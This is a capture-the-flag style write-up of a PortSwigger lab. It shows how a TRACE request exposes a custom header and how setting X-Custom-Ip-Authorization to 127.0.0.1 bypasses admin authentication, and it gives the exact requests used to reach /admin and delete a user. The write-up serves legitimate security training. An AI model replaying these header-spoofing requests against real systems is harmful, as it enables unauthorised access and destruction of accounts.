
# Authentication bypass via information disclosure

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 

- https://portswigger.net/web-security/information-disclosure/exploiting



![img](images/Authentication%20bypass%20via%20information%20disclosure/1.png)

---------------------------------------------

After logging in, send a request with the TRACE HTTP method, which reveals the header “X-Custom-IP-Authorization”:



![img](images/Authentication%20bypass%20via%20information%20disclosure/2.png)


It is possible to access /admin with:

```
GET /admin HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```



![img](images/Authentication%20bypass%20via%20information%20disclosure/3.png)


And then delete the user with:

```
GET /admin/delete?username=carlos HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```



![img](images/Authentication%20bypass%20via%20information%20disclosure/4.png)